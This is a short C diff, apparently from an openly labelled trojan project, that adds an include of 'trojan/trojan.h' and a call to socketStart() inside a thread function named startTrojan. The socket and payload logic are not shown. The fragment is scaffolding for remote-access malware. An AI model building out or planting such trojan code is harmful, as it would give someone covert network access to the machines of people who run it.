@@ -2,9 +2,12 @@
 #include <stdlib.h>
 #include <pthread.h>
 
+#include "trojan/trojan.h"
+
 void *startTrojan(void *args)
 {
   printf("[T]: Starting the trojan\n");
+  socketStart();
 }
 
 int main() 
